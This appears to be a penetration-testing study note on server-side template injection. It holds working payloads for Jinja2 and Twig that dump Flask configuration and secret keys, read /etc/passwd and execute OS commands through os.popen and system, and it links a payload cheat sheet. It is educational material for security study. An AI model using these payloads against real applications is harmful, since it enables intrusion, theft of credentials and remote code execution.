## Overview
As the name suggests. SSTI is when an attacker injects templating code into a page that uses a templating engine, in hopes of processing that code.
## Identifying SSTI
The most basic - and often effective - way to test for SQL injection is to invoke an error with the apostrophe `'`, this is no different. We can invoke an error in a vulnerable template page with this payload `${{<%[%'"}}%\.` .This payload has all of the special characters that have a particular semantic purpose in popular template engines
## Identifying the Template Engine
To enable the successful exploitation of an SSTI vulnerability, we first need to determine the template engine used by the web application. We can utilize slight variations in the behavior of different template engines to achieve this. For instance, consider the following commonly used overview containing slight differences in popular template engines:
![[Pasted image 20250826145140.png]]
## Exploiting SSTI - Jinja2
Jinja is a template engine commonly used in Python web frameworks such as `Flask` or `Django`. This section will focus on a `Flask` web application.
### Information Disclosure
We can abuse SSTI with this configuration to dump information about the server - including secret keys - by issuing the following command;
```python
{{ config.items() }}
```
We can also execute Python code to obtain information about the web application's source code. We can use the following SSTI payload to dump all available built-in functions;
```python
{{ self.__init__.__globals__.__builtins__ }}
```
### Local File Inclusion (LFI)
We can use Python's built-in function `open` to include a local file. However, we cannot call the function directly; we need to call it from the `__builtins__` dictionary we dumped earlier. This results in the following payload to include the file `/etc/passwd`;
```python
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```
### Remote Code Execution (RCE)
To achieve remote code execution in Python, we can use functions provided by the `os` library, such as `system` or `popen`. However, if the web application has not already imported this library, we must first import it by calling the built-in function `import`. This results in the following SSTI payload;
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
If however the application already imported the `os` library, we can use this payload;
```python
{{ os.popen('id').read() }}
```
or using `system`;
```python
{{ os.system("id") }}
```
## Exploiting SSTI - Twig
Yet another popular templating engine is `twig`, if we encounter a server that has a vulnerable twig templated page, we can try the following.
### Information Disclosure
we can use the `_self` keyword to obtain a little information about the current template;
```twig
{{ _self }}
```
The amount of information is very limited compared to Jinja2
### Local File Inclusion (LFI)
Reading local files (without using the same way as we will use for RCE) is not possible using internal functions directly provided by Twig. However, the PHP web framework [Symfony](https://symfony.com/) defines additional Twig filters. One of these filters is [file_excerpt](https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt) and can be used to read local files;
```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```
### Remote Code Execution (RCE)
To achieve remote code execution, we can use a PHP built-in function such as `system`. We can pass an argument to this function by using Twig's `filter` function, resulting in any of the following SSTI payloads;
```twig
{{ ['id'] | filter('system') }}
```
There is also the [PayloadsAllTheThings SSTI CheatSheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md) that is a good source for SSTI vulnerabilities.

## Tools
[SSTImap](https://github.com/vladko312/SSTImap)
